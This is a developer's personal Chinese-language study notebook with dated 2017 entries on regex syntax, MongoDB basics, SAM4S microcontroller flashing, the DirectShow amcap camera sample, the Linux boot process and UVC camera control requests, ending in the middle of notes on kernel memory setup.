				但不能匹配 "Windows 2000" 中的 "Windows"。预查不消耗字符，
				也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。
		x|y 	匹配 x 或 y。例如，'z|food' 能匹配 "z" 或 "food"。'(z|f)ood' 则匹配 "zood" 或 "food"。
		[xyz] 	字符集合。匹配所包含的任意一个字符。例如， '[abc]' 可以匹配 "plain" 中的 'a'。
		[^xyz] 	负值字符集合。匹配未包含的任意字符。例如， '[^abc]' 可以匹配 "plain" 中的'p'、'l'、'i'、'n'。
		[a-z] 	字符范围。匹配指定范围内的任意字符。例如，'[a-z]' 可以匹配 'a' 到 'z' 范围内的任意小写字母字符。
		[^a-z] 	负值字符范围。匹配任何不在指定范围内的任意字符。例如，'[^a-z]' 可以匹配任何不在 'a' 到 'z' 范围内的任意字符。
		\b 	匹配一个单词边界，也就是指单词和空格间的位置。例如， 'er\b' 可以匹配"never" 中的 'er'，但不能匹配 "verb" 中的 'er'。
		\B 	匹配非单词边界。'er\B' 能匹配 "verb" 中的 'er'，但不能匹配 "never" 中的 'er'。
		\cx 	匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。
			否则，将 c 视为一个原义的 'c' 字符。
		\d 	匹配一个数字字符。等价于 [0-9]。
		\D 	匹配一个非数字字符。等价于 [^0-9]。
		\f 	匹配一个换页符。等价于 \x0c 和 \cL。
		\n 	匹配一个换行符。等价于 \x0a 和 \cJ。
		\r 	匹配一个回车符。等价于 \x0d 和 \cM。
		\s 	匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。
		\S 	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
		\t 	匹配一个制表符。等价于 \x09 和 \cI。
		\v 	匹配一个垂直制表符。等价于 \x0b 和 \cK。
		\w 	匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。
		\W 	匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。
		\xn 	匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。
			例如，'\x41' 匹配 "A"。'\x041' 则等价于 '\x04' & "1"。正则表达式中可以使用 ASCII 编码。
		\num 	匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，'(.)\1' 匹配两个连续的相同字符。
		\n 	标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。
			否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。
		\nm 	标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。
			如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。
			如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。
		\nml 	如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。
		\un 	匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。
	表达符号的优先级:(从高到低排)
		\ 				转义符
		(), (?:), (?=), [] 		圆括号和方括号
		*, +, ?, {n}, {n,}, {n,m} 	限定符
		^, $, \任何元字符、任何字符 	定位点和序列（即：位置和顺序）
		| 				替换，"或"操作
						字符具有高于替换运算符的优先级，使得"m|food"匹配"m"或"food"。
						若要匹配"mood"或"food"，请使用括号创建子表达式，从而产生"(m|f)ood"。
		(注意,同级别的,从左到右进行运算) 
	实战:
		/Chapter [1-9][0-9]*/	//注意 需要用前后的"/"符号包住中间的正则表达式,是一种规范写法!!
					//这表达式表示除了匹配 Chapter 1  至  Chapter 99 的范围,还有例如可匹配到
					//Chapter 133 , Chapter 288888 , chapter 5777777777 , 等这些奇怪的字符串 	
		/Chapter [0-9]{1,2}/	//这表达式表示只匹配 Chapter 0  至  Chapter 99 的范围!!!
		/Chapter [1-9][0-9]?/		//这表达式表示 Chapter 1  至  Chapter 99 的范围!!!
		/Chapter [1-9][0-9]{0,1}/	//这表达式表示 Chapter 1  至  Chapter 99 的范围!!!
		/<.*>/		//下面的表达式匹配从开始小于符号 (<) 到关闭 H1 标记的大于符号 (>) 之间的所有内容
				//	即可以匹配整句 <H1>Chapter 1 - 介绍正则表达式</H1>	
				//注意,这里的 * 是指后接0个或多个 . 表达式符,即后接0个或多个任意字符,所以可以匹配整句,
		/<.*?>/		//这里 学习 最少匹配概念, *? 或者 +? 都是最小匹配组合符!!!
				//比如 	<H1>Chapter 1 - 介绍正则表达式</H1>,
				//这里 就只会匹配到 <H1> 而已, 而不会匹配整句!!!
		/<\w+?>/	//同样也是最少匹配 , <H1>Chapter 1 - 介绍正则表达式</H1>, 一句,只会匹配到 <H1> 而已
				// \W 也表示字符类, 与 . 是一样的意思
		/\bCha/		//可以匹配到单词 Chapter 的Cha 
		/ter\b/		//可以匹配到单词 Chapter 的ter
		/\Bapt/		//可以匹配到单词 Chapter 的apt ,但不能匹配单词 aptitude 中的字符串 apt
	javascript实战:
		1,
		<script>
		var str = "Is is the cost of of gasoline going up up";
		var patt1 = /\b([a-z]+) \1\b/ig;
		document.write(str.match(patt1));
		</script>
		//  /\b([a-z]+) \1\b/ig 匹配出 Is is,of of,up up 并显示
		//第一个\b 是空格与字符的字边界,第二个\b 是字符与控股的边界
		// ([a-z]+) 很明显指的是 Is is of up
		// \1 指的是第一个子匹配项 即 ([a-z]+)
		// 没有 后面的ig时, /\b([a-z]+) \1\b/ 只会匹配到 Is is 一条!!!!
		// i只不区分大小写,g指全局, 全局指最多次遍历匹配, 于是把 of of,up up 这两条也匹配出来!!!
		// 最终得到一个包含两个数据的数组:
		//	patt1[0] = "Is is,of of,up up"
		//	patt1[1] = "up"
		2,
		<script>
		var str = "http://www.runoob.com:80/html/html-tutorial.html";
		var patt1 = /(\w+):\/\/([^/:]+)(:\d*)?([^# ]*)/;
		arr = str.match(patt1);
		for (var i = 0; i < arr.length ; i++) {
		    document.write(arr[i]);
			document.write("<br>");
		}
		</script>
		// /(\w+):\/\/([^/:]+)(:\d*)?([^# ]*)/ 完全匹配 http://www.runoob.com:80/html/html-tutorial.html
		// (\w+):\/\/	匹配出 	http://    其中 (\w+)匹配出http
		// ([^/:]+)  中 [^/:] 的^在这里并没有开头的意思,但 ^/: 指从此处开始,匹配不包括 / 和 : 这两个符号的意思
		//	所以,这时+相当于 一个或多个[^/:] 的意思,于是 连续匹配了 www.runoob.com,
		//	遇到:的时候,^/:不满足,所以打住了,
		//	所以 ([^/:]+) 匹配了 www.runoob.com
		//(:\d*)?	匹配出 :80 , 
		//	首先 / 和 : 符号在正则方程里就是纯粹 / 和 : 符号, 没有其他意思,也不需要使用转义字符 \ 去表达,
		//	\d 就是匹配 数字,\d* 就是匹配任意位数的数字
		//	?  就是指 0个或1个 (:\d*) , 于是就匹配出了  :80
		//([^# ]*)	匹配出	/html/html-tutorial.html 
		//	[^# ] 表示 匹配不包括 # 字符
		//	* 表示 0个或者多个 [^# ] 所以最终匹配出/html/html-tutorial.html
		// 最终得到一个包含多个数据的数组:
		//	arr[0] = "http://www.runoob.com:80/html/html-tutorial.html"
		//	arr[1] = "http"
		//	arr[2] = "www.runoob.com"
		//	arr[3] = ":80"
		//	arr[4] = "/html/html-tutorial.html"
		//所以注意到, js 会把 正则表达式的 () 子表达式匹配出的内容也会保存起来!!!!!
	注意区分:
		^once 和 [^once] ,前者是,匹配出一个开头是once字符串内容的句,
				  后者是,匹配当前字符中不能是 c,e,n,o 其中之一!!!	
	在线实验网址: https://c.runoob.com/front-end/854 (非常好用)
		     https://c.runoob.com/
html5 学习:
	并没有太难的!!!
	主要是video 和数据库的接口重点看看
MangoDB(分布式文件存储的数据库,有别与Mysql):
	manggo 的shell 命令操作是符合javascript语言标准
	而Mysql的shell 命令操作是基于 一整套sql语法!!
	mangoDB 的每条数据条格式与 json相似 例如:
		{"site":"www.baidu.com"}
		{"site":"www.google.com","name":"Google"}
		{"site":"www.runoob.com","name":"菜鸟教程","num":5}
	与sql比较!!!
		SQL术语/概念 	MongoDB术语/概念 	解释/说明
		database 	database 	数据库
		table 	collection 	数据库表/集合
		row 	document 	数据记录行/文档
		column 	field 	数据字段/域
		index 	index 	索引
		table joins 	  	表连接,MongoDB不支持
		primary key 	primary key 	主键,MongoDB自动将_id字段设置为主键
	Capped collections 就是固定大小的collection	
	在MongoDB数据库中名字空间 <dbname>.system.* 是包含多种系统信息的特殊集合(Collection)，如下:
		集合命名空间		 	描述
		dbname.system.namespaces 	列出所有名字空间。
		dbname.system.indexes 		列出所有索引。
		dbname.system.profile 		包含数据库概要(profile)信息。
		dbname.system.users 		列出所有可访问数据库的用户。
		dbname.local.sources 		包含复制对端（slave）的服务器信息和状态。		
	MongoDB 数据类型
		数据类型 	描述
		String		字符串。存储数据常用的数据类型。在 MongoDB 中，UTF-8 编码的字符串才是合法的。
		Integer		整型数值。用于存储数值。根据你所采用的服务器，可分为 32 位或 64 位。
		Boolean		布尔值。用于存储布尔值（真/假）。
		Double		双精度浮点值。用于存储浮点值。
		Min/Max keys	将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比。
		Arrays		用于将数组或列表或多个值存储为一个键。
		Timestamp	时间戳。记录文档修改或添加的具体时间。
		Object		用于内嵌文档。
		Null		用于创建空值。
		Symbol		符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。
		Date		日期时间。用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。
		Object ID	对象 ID。用于创建文档的 ID。
		Binary Data	二进制数据。用于存储二进制数据。
		Code		代码类型。用于在文档中存储 JavaScript 代码。
		Regular expression	正则表达式类型。用于存储正则表达式。
	启动mangoDB服务:
		mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]
			mongodb:// 这是固定的格式，必须要指定。
			username:password@ 可选项，如果设置，在连接数据库服务器之后，驱动都会尝试登陆这个数据库
			host1 必须的指定至少一个host, host1 是这个URI唯一要填写的。
使用用户名fred，密码foobar登录localhost的baz数据库。

mongodb://fred:foobar@localhost/baz				它指定了要连接服务器的地址。如果要连接复制集，请指定多个主机地址。
			portX 可选的指定端口，如果不填，默认为27017
			/database 如果指定username:password@，连接并验证登陆指定数据库。若不指定，默认打开 test 数据库。
			?options 是连接选项。如果不使用/database，则前面需要加上/。
				所有连接选项都是键值对name=value，键值对之间通过&或;（分号）隔开 
		例子:
			使用用户名fred，密码foobar登录localhost的baz数据库。
			mongodb://fred:foobar@localhost/baz












20170719
搭建sam4s烧录环境:
	首先,使用sam-ba2.16 需要打上补丁才可以 connect sam4s系列的芯片,
	虽然是xplainted 板子,但是connect里只有ek板子选项,所以可以选ek对应型号代替
	每次烧录,eraseall时,都会有超时错误!!!,所以eraseall后,要重新登陆sam-ba 去烧录
uvc研究安装amcap工程:
	几经波折,终于找到了vs2015可用的amcap程序(直接一套windows sdk7_sample,)
	源码地址:https://github.com/pauldotknopf/WindowsSDK7-Samples
	先打开 directshow/baseclasses 的sln 编译baseclasses库,例如我们编为debug版本
	然后打开 amcap 项目 ,先配置 amcap项目属性 -> VC++目录 -> 
		包含目录是添加 directshow/baseclasses
		库目录添加 directshow/baseclasses/debug
	然后编译,就可以工作了
分析amcap:
	重点关注 启动摄像头的函数!!!
	所以关注函数:
	amcap.cpp
		AddDevicetoMenu
		chooseDevices
		setappcaption
		startpreview
		getdc
		Makebuilder 建立 capture graph builder 对象 
		CoCreateInstance 获得 ICaptureGraphBuilder 接口指针
		CreaterClassEnumerator 列举捕捉系统设备
	SampleCGB.cpp
		Findinterface
		Findpin
		reanderstream
		setfiltergraph
研究发现amcap把打开摄像头设备的函数封装起来了!!!
	关注变量:
	gcap!!!
	gcap.fWantPreview(预览功能)
	gcap.iMasterStream(声音流,视频流谁主导,谁配合同步)
struct _capstuff
{
    WCHAR wszCaptureFile[_MAX_PATH];		// 捕捉文件的路径，该文件保存捕捉到的视频
    WORD wCapFileSize;  // size in Meg		捕捉文件的size
    ISampleCaptureGraphBuilder *pBuilder;	// ISampleCGB    类对象实例的指针
    IVideoWindow *pVW;						// 视频显示窗口的指针，利用该指针将视频显示在项目的界面内
    IMediaEventEx *pME;						// 媒体事件接口的指针，用来控制filtergraph的play、stop等
    IAMDroppedFrames *pDF;					// 获取捕捉过程中丢帧数的接口指针
    IAMVideoCompression *pVC;				// 视频压缩接口指针，捕捉文件为mpeg2格式时用到
    IAMVfwCaptureDialogs *pDlg;				// 用于捕捉器件设置的对话框接口指针
    IAMStreamConfig *pASC;      // for audio cap	音频捕捉流配置接口指针
    IAMStreamConfig *pVSC;      // for video cap	视频捕捉流配置接口指针
    IBaseFilter *pRender;					// 显示视频图像的filter的接口指针
    IBaseFilter *pVCap, *pACap;				// 视频、音频捕捉器件的filter的接口指针
    IGraphBuilder *pFg;						// ISampleCGB中用于建立filtergraph的builder的接口指针
    IFileSinkFilter *pSink;					// 保存文件要用到的FileSinkFilter的接口指针
    IConfigAviMux *pConfigAviMux;			// Avi合成器件的filter的接口指针
    int  iMasterStream;						// 标识哪一个流作为MsterStream的整型变量
    BOOL fCaptureGraphBuilt;				// 标识是否 已建立了捕捉用的filter graph
    BOOL fPreviewGraphBuilt;				// 是否已建立了预览用的filter  graph
    BOOL fCapturing;						// 是否正在捕捉？
    BOOL fPreviewing;						// 是否正在预览？
    BOOL fMPEG2;							// 是MPEG2的视频源码？如有线电视接收器等的信号源
    BOOL fCapAudio;							// 需要捕捉音频吗?
    BOOL fCapCC;							// 需要显示MPEG2中的隐藏式字幕吗?
    BOOL fCCAvail;							// 有可用的隐藏式字幕吗?只有VBI图文视频流才可用
    BOOL fCapAudioIsRelevant;				// 捕捉的视频已有关联的音频吗？
    bool fDeviceMenuPopulated;				// Devices菜单已填写？
    IMoniker *rgpmVideoMenu[10];			// 保存视频捕捉器件菜单中每个器件的标识(名字)接口
    IMoniker *rgpmAudioMenu[10];			// 保存音频捕捉器件菜单中每个器件的标识(名字)
    IMoniker *pmVideo;						// 获取视频捕捉filter的friendlyname的标识接口的指针
    IMoniker *pmAudio;						// 获取音频捕捉filter的friendlyname的标识接口的指针
    double FrameRate;						// 用户设定的帧率数值，即每秒帧数
    BOOL fWantPreview;						// 需要预览吗？
    long lCapStartTime;						// 开始捕捉的时间
    long lCapStopTime;						// 停止捕捉的时间
    WCHAR wachFriendlyName[120];			// 保存捕捉器件的友善名称的字符串数组
    BOOL fUseTimeLimit;						// 是否使用时间限制？
    BOOL fUseFrameRate;						// 是否使用用户设定的帧率？
    DWORD dwTimeLimit;						// 用户设定的时间限制长度数值
    int iFormatDialogPos;					// VFW设备设置format输出格式的属性页的起始位置值
    int iSourceDialogPos;					// VFW设备设置source信号源的属性页的起始位置值
    int iDisplayDialogPos;					// VFW设备设置display显示参数的属性页的起始位置值
    int iVCapDialogPos;						// WDM视频设备的属性页的起始位置值
    int iVCrossbarDialogPos;				// WDM视频设备的输入选择对话框的起始位置值
    int iTVTunerDialogPos;					// WDM电视设备的调谐对话框的起始位置值
    int iACapDialogPos;						// WDM音频设备的属性页的起始位置值
    int iACrossbarDialogPos;				// WDM音频设备的输入选择对话框的起始位置值
    int iTVAudioDialogPos;					// WDM电视设备的音频属性页的起始位置值
    int iVCapCapturePinDialogPos;			// WDM视频设备的捕捉Pin属性页的起始位置值
    int iVCapPreviewPinDialogPos;			// WDM视频设备的预览Pin属性页的起始位置值
    int iACapCapturePinDialogPos;			// WDM音频设备的捕捉Pin属性页的起始位置值
    long lDroppedBase;						// 丢帧数
    long lNotBase;							// 捕捉帧数
    BOOL fPreviewFaked;						// 当捕捉设备没有preview pin时，是否用capture pin充当preview pin
    CCrossbar *pCrossbar;					// CCrossbar类对象指针
    int iVideoInputMenuPos;					// 选中的视频输入源在输入菜单中的位置值
    LONG NumberOfVideoInputs;				// 视频输入源的数量
    HMENU hMenuPopup;						// 菜单句柄
    int iNumVCapDevices;					// 现有视频捕捉设备数量
} gcap;









20170721
分析sam4s 的pir程序:
	主要是了解 并行io 如何抓取图像
	全程只有判断 vsync 信号
	还有 是通过 pioc 并口中断 来执行中断处理函数的,
		而且,似乎是8位针状态同时改变会被监测到,并且触发 并口中断,记录下并口针状态信息,就是一个像素点!!!
	首先,知道了固定的cap_buf 指针变量: cap_dest_buf
	就是,在 获取像素数据的中断处理函数出现疑问!!!!
	rxbuff interrupt 是接受buf溢出中断,表示接收好一张图片,通过 PIO_capture_buff来表示 
	芯片提供的pio功能 可处理两个缓存
	pio->RPR receive pointer register	//第一个缓存地址
	pio->RCR receive counter register	//第一个缓存大小
	pio->RNPR receive next pointer register	//第二个缓存地址
	pio->RNCR receive next counter register //第二个缓存大小
	piodc工作原理假设:
	首先 PIODC_Capture_init() 设置了需要采集 pio数据 的那9个位,(8个数据,一个pck)
	当这些位的状态改变后就会触发中断,中断执行过程中,还有新的改变会被忽略!!!
	而每次中断都会采集 当下的 pio针位状态 并记录,
	一般,数据位几乎同时间改变,即使说有数据位先改变先触发中断,但是在中函数记录数据位状态之前,
	数据位已经全部改变完毕处于稳定状态,这是记录下来的数据是有效的!!!!
	关于记录数据!!
	PIO_CaptureHandler 似乎并没有做什么!! 关键是_PioCaptureCopy->xxxx 这些xxxxx虚拟函数都没有指向,所以什么都没有做
	而记录数据处理的,似乎是PioInterruptHandler(),但发现又好像不是!!!
	都不知道是在哪里记录数据的!!!
	不过,很多实际问题表示,上述piodc假设只对了一部分,
	中断触发的检测不应该是检测所有数据针,而应该仅仅是 pck针 被监测而已!!!!
	
	
	






20170724
linux 补充学习:
Linux 系统启动过程可以分为5个阶段：
	内核的引导。
	运行 init。
	系统初始化。
	建立终端 。
	用户登录系统。
init程序的类型：
        SysV: init, CentOS 5之前, 配置文件： /etc/inittab。
        Upstart: init,CentOS 6, 配置文件： /etc/inittab, /etc/init/*.conf。		//这段注释不用管"*/"
        Systemd： systemd, CentOS 7,配置文件： /usr/lib/systemd/system、 /etc/systemd/system。
内核引导
	当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。
	操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。
运行init
	init 进程是系统所有进程的起点，没有这个进程，系统中任何进程都不会启动。
	init 程序首先是需要读取配置文件 /etc/inittab。
运行级别
	许多程序需要开机启动。它们在Windows叫做"服务"（service），在Linux就叫做"守护进程"（daemon）。
	init进程的一大任务，就是去运行这些开机启动的程序。
	不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。
	Linux允许为不同的场合，分配不同的开机启动程序，这就叫做"运行级别"（runlevel）。也就是说，启动时根据"运行级别"，确定要运行哪些程序。
	Linux系统有7个运行级别(runlevel)：
		运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动
		运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆
		运行级别2：多用户状态(没有NFS)
		运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式
		运行级别4：系统未使用，保留
		运行级别5：X11控制台，登陆后进入图形GUI模式
		运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动
系统初始化
	在init的配置文件中有这么一行： si::sysinit:/etc/rc.d/rc.sysinit　它调用执行了/etc/rc.d/rc.sysinit，
	而rc.sysinit是一个bash shell的脚本，它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。
		它主要完成的工作有：激活交换分区，检查磁盘，加载硬件模块以及其它一些需要优先执行任务。
	l5:5:wait:/etc/rc.d/rc 5
	这一行表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，
	它接受5作为参数，去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，
	/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件，而不是真正的rc启动脚本，
	真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。
	而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、restart、status等参数。
	/etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的连接文件，对于以以S开头的启动脚本，将以start参数来运行。
	而如果发现存在相应的脚本也存在K打头的连接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)，
		则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。
		这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。
	至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的"System Services"来自行设定。
建立终端
	rc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。
	init接下来会打开6个终端，以便用户登录系统。在inittab中的以下6行就是定义了6个终端：
	1:2345:respawn:/sbin/mingetty tty1
	2:2345:respawn:/sbin/mingetty tty2
	3:2345:respawn:/sbin/mingetty tty3
	4:2345:respawn:/sbin/mingetty tty4
	5:2345:respawn:/sbin/mingetty tty5
	6:2345:respawn:/sbin/mingetty tty6
	从上面可以看出在2、3、4、5的运行级别中都将以respawn方式运行mingetty程序，mingetty程序能打开终端、设置模式。
	同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名，
	而用户输入的用户将作为参数传给login程序来验证用户的身份。
用户登录系统
	一般来说，用户的登录方式有三种：
	（1）命令行登录
	（2）ssh登录
	（3）图形界面登录
	对于运行级别为5的图形方式用户来说，他们的登录是通过一个图形化的登录界面。登录成功后可以直接进入KDE、Gnome等窗口管理器。
	而本文主要讲的还是文本方式登录的情况：当我们看到mingetty的登录界面时，我们就可以输入用户名和密码来登录系统了。
	Linux的账号验证程序是login，login会接收mingetty传来的用户名作为用户名参数。
	然后login会对用户名进行分析：如果用户名不是root，且存在/etc/nologin文件，login将输出nologin文件的内容，然后退出。
	这通常用来系统维护时防止非root用户登录。只有/etc/securetty中登记了的终端才允许root用户登录，
	如果不存在这个文件，则root可以在任何终端上登录。
	/etc/usertty文件用于对用户作出附加访问限制，如果不存在这个文件，则没有其他限制。
图形模式与文字模式的切换方式
	Linux预设提供了六个命令窗口终端机让我们来登录。
	默认我们登录的就是第一个窗口，也就是tty1，这个六个窗口分别为tty1,tty2 … tty6，你可以按下Ctrl + Alt + F1 ~ F6 来切换它们。
	如果你安装了图形界面，默认情况下是进入图形界面的，此时你就可以按Ctrl + Alt + F1 ~ F6来进入其中一个命令窗口界面。
	当你进入命令窗口界面后再返回图形界面只要按下Ctrl + Alt + F7 就回来了。
	如果你用的vmware 虚拟机，命令窗口切换的快捷键为 Alt + Space + F1~F6. 
	如果你在图形界面下请按Alt + Shift + Ctrl + F1~F6 切换至命令窗口。
Linux 关机
	在linux领域内大多用在服务器上，很少遇到关机的操作。毕竟服务器上跑一个服务是永无止境的，除非特殊情况下，不得已才会关机。
	正确的关机流程为：sync > shutdown > reboot > halt
	关机指令为：shutdown ，你可以man shutdown 来看一下帮助文档。
	例如你可以运行如下命令关机：
	sync 将数据由内存同步到硬盘中。
	shutdown 关机指令，你可以man shutdown 来看一下帮助文档。例如你可以运行如下命令关机：
	shutdown –h 10 ‘This server will shutdown after 10 mins’ 	//计算机将在10分钟后关机，并且会显示在登陆用户的当前屏幕中。
	Shutdown –h now //立马关机
	Shutdown –h 20:25 //系统会在今天20:25关机
	Shutdown –h +10 //十分钟后关机
	Shutdown –r now //系统立马重启
	Shutdown –r +10 //系统十分钟后重启
	reboot 就是重启，等同于 shutdown –r now
	halt 关闭系统，等同于shutdown –h now 和 poweroff
	最后总结一下，不管是重启系统还是关闭系统，首先要运行 sync 命令，把内存中的数据写到磁盘中。
	关机的命令有 shutdown –h now halt poweroff 和 init 0 , 重启系统的命令有 shutdown –r now reboot init 6。


	







20170726
uvc 枚举过程分析:
	http://bbs.eeworld.com.cn/thread-474097-1-1.html

uvc详细学习分析:	
	CONTROL SELECTOR (cs)

	camera terminal (CT) :  修改控制 video stream 特征 终端 就是说是uvc 标准命令终端
		例如 zoom iris AE roll 等控制
	input terminal (IT) : 原始流数据进入 视频编码器 端口 : 这里说的是,设备本身就存有的视频流,等
	output terminal (OT) : 视频编码器 输出数据流 的端口 : 这里说的是,数据从device端的视频编码器流出,进入host IN端
		一般来说,我们的 UVC 只用 OT 端, 而不会使用 IT端!!!,
		因为源数据从摄像头流入视频编码器,再通过usb传上pc
		而不是源数据从pc通过usb 流入设备的视频编码器,
	selector unit (SU): 多路输入流 经SU 选择其中一路,输出
	Processin unit (PU): 和 CT 相似,也是处理 uvc 标准命令的!!!
	Encoding unit (EU): 编码单元!!!
	Extension unit (XU): 延伸unit ,额外的控制单元供厂商使用 
	uvc拓扑结构例子分析:
		1,
		sensor -> CT(unit ID 2) ----------------|
				  	   		|--> su(unit ID 3) -> pu(unit ID 4) -> OT(unit ID 5) ->PC
		composite_from_device -> IT(unit ID 1) -|
		一般uvc系统由多个模块联接而成, 
		CT(camera terminal):从sensor引入数据流,而IT(input terminal)从其他渠道引入的数据流,IT,CT的功能是差不多的	
		SU(selector unit):就是从众多输入单元,诸如 CT IT中选择其中一个,供给后续处理
		PU(processing unit):数据流进一步处理的单元
		OT(output terminal):输出单元,就是往usb总线输出流数据的单元!!!
		上述模块都有一个unit ID,这些ID是人为设定的而不是协议规定地,ID都设在各自的 descriptor 里, 
			usb插入枚举时,会上传到pc上!!!,unitID非常重要, 
		#define CT_CONTROL_UNDEFINED                0x00
		#define CT_SCANNING_MODE_CONTROL            0x01
		#define CT_AE_MODE_CONTROL                  0x02
		#define CT_AE_PRIORITY_CONTROL              0x03
		#define CT_EXPOSURE_TIME_ABSOLUTE_CONTROL   0x04
		#define CT_EXPOSURE_TIME_RELATIVE_CONTROL   0x05
		#define CT_FOCUS_ABSOLUTE_CONTROL           0x06
		#define CT_FOCUS_RELATIVE_CONTROL           0x07
		#define CT_FOCUS_AUTO_CONTROL               0x08
		#define CT_IRIS_ABSOLUTE_CONTROL            0x09
		#define CT_IRIS_RELATIVE_CONTROL            0x0A
		#define CT_ZOOM_ABSOLUTE_CONTROL            0x0B
		#define CT_ZOOM_RELATIVE_CONTROL            0x0C
		#define CT_PANTILT_ABSOLUTE_CONTROL         0x0D
		#define CT_PANTILT_RELATIVE_CONTROL         0x0E
		#define CT_ROLL_ABSOLUTE_CONTROL            0x0F
		#define CT_ROLL_RELATIVE_CONTROL            0x10
		#define CT_PRIVACY_CONTROL                  0x11
		上述是对 CT单元操作的一些标准指令集,实际操作例子:
		給sensor传递一个缩放动作的请求, 我们的usb如此递交这样的申请
			bmRequestType	0x21		D7: 0 = Host to device
							D6..5: 01 = Class request
							D4..0: 00001 = Recipient is interface	
			bRequest	0x01		SET_CUR
			wValue		0x0B00		CT_ZOOM_ABSOLUTE_CONTROL
			wIndex		0x0200		CT(unit ID 2) -> 0x02, VideoControl interface ID 0 -> 0x00
			wLength		0x0002		datasize 2 bytes
			data		0xc4 0x56	data	
		特别注意wIndex ,这里填的ID 是 descriptors 设定好的id, 
			如果 CT(unit ID 7),VideoControl interface ID 6	则变为0x0706
			如果 CT(unit ID 2),VideoControl interface ID 0  而wIndex是0x0500,
			由于 unit ID 5 不是 CT模块, 而是 PU模块 
			所以 wValue = 0x0B00,并不是指代CT_ZOOM_ABSOLUTE_CONTROL指令,
			而是 PU_WHITE_BALANCE_TEMPERATURE_AUTO_CONTROL
			分配 unit ID 号时,不能分配 0号ID, 因为unit ID 0 号在UVC上有固定用途!!
		2,
		sensor -> CT -> PU ------------> OT -> (USB IN Endpoint 1,video streaming interface 1)
				    |-> EU ----> OT -> (USB IN Endpoint 2,video streaming interface 2)
				    |-> EU ----> OT -> (USB IN Endpoint 3,video streaming interface 3)
				    .....
		EU (extend unit): 延伸模块,就是用户自定义处理模块!!!!!!
渐渐地 UVC 有点眉目了!!
	首先 一个 usb请求 分 bmRequestType bRequest wValue wIndex wLength Data
		bmRequestType :标识是 UVC 
		bRequest : setcur getcur getmax setmax ........
		wValue : control selector 
		wIndex : 0(控制端口) 和其他端口
		wLength : Data 数据 size
		Data: 数据!!!
	然而wValue wValue 是关键, wValue可以是CT_ , VS_ ,PU_ ,,,, 很多都重码,不知道什么时候是CT_操作,什么时候是PU_操作,,,,,(已解决)
UVC启动枚举分析:
	1,
	bmRequestType	0xA1		D7: 1 = Device To host
					D6..5: 01 = Class request
					D4..0: 00001 = Recipient is interface	
	bRequest	0x01		SET_CUR
	wValue		0x0100		VS_PROBE_CONTROl
	wIndex		0x0001		unit ID 0 -> 0x00, Videostreaming interface ID 1 -> 0x01
	wLength		0x001A		datasize 26 bytes
	然后收到请求后 device 返回
	

sam4s16c-ek 的iar demo问题:
	关于 core_cmd4.h 找不到: c++ include路径添加同项目的 CMSIS/Include
	关于 __get_PSR() 找不到: 检查,项目对应的target 有没有选对cpu !!!!
	卧槽,ek板子的demo程序是只能 放在 SRAM上, reset, 会跳到 sram 上运行!!!!,怎么烧到flash上运行?
		解决: 项目的options-linker-config 下更换linker文件为 flash.icf,而非sram.icf
		这下,可以通过samba 烧到 flash 里运行了  	
补充:
natation 原子操作!!










20170802
linux内核态, 用户态, MMU, page-table 管理 等等关于内存分配管理的内容 补充学习!!!
首先分析内核启动中的内存内容
start_kernel()
    ->setup_arch()
        ->内存设置代码
          meminfo结构表明内存情况，是对物理内存结构meminfo的默认初始化。
          nr_banks指定内存块的数量，bank指定每块内存的范围，
          PHYS _OFFSET指定某块内存块的开始地址，MEM_SIZE指定某块内存块长度。
          PHYS _OFFSET和MEM_SIZE都定义在include/asm-armnommu/arch-XXX/memory.h文件中，
          其中 PHYS _OFFSET是内存的开始地址，MEM_SIZE就是内存的结束地址。
          if (meminfo.nr_banks == 0) 
          { 
              meminfo.nr_banks = 1; 
